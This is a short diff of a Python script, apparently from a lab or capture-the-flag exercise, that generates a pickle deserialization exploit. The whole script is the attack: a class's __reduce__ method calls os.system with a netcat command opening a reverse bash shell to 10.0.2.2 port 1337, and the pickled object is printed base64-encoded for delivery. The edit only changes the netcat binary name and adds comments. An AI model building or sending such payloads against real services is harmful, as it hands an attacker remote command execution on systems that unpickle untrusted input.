@@ -5,6 +5,8 @@ import os
 
 class rce(object):
   def __reduce__(self):
-    return (os.system, ('nc.traditional -e /bin/bash 10.0.2.2 1337',))
+    # this method will execute on deserialization :)
+    return (os.system, ('nc -e /bin/bash 10.0.2.2 1337',))
 
+# base64-encode and print the payload
 print(base64.b64encode(pickle.dumps(rce())))
